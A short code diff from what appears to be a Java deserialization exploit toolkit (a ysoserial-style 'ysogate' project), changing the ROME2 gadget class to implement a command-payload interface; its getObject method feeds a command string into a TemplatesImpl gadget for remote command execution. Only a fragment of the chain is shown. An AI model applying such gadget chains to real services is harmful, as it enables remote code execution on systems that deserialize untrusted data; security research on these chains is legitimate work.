@@ -4,7 +4,7 @@ package com.h2tg.ysogate.payloads.gadgets;
 import com.h2tg.ysogate.payloads.gadgets.jdk.GHashMap;
 import com.h2tg.ysogate.utils.PayloadRunner;
 import com.sun.syndication.feed.impl.EqualsBean;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
 import com.h2tg.ysogate.utils.Reflections;
@@ -17,7 +17,8 @@ import java.util.Map;
  * JDK 8+
  */
 @Dependencies("rome:rome:1.0")
-public class ROME2 implements ObjectPayload<Object> {
+public class ROME2 implements CommandObjectPayload<Object>
+{
 
 	public Object getObject(String command) throws Exception {
 		Object o = Gadgets.createTemplatesImpl(command);
